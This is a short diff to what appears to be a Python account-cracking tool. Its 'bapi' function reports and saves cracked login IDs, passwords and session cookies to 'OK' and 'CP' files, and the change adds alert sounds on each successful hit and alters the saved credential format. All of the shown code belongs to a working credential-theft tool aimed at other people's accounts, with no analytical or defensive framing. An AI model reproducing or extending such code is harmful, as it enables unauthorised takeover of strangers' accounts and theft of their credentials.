@@ -1133,6 +1133,7 @@ def bapi(idf,pwv):
                 statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
                 statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
                 cetak(statuscp1)
+                os.popen('play-audio c.mp3')
                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                 akun.append(idf+'|'+pw)
                 break
@@ -1144,7 +1145,8 @@ def bapi(idf,pwv):
                 statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                 statusok1 = nel(statusok, width=90, style='bold green', title='OK')
                 cetak(statusok1)
-                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+                os.popen('play-audio o.mp3')
+                open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                 break
             else:
                 continue
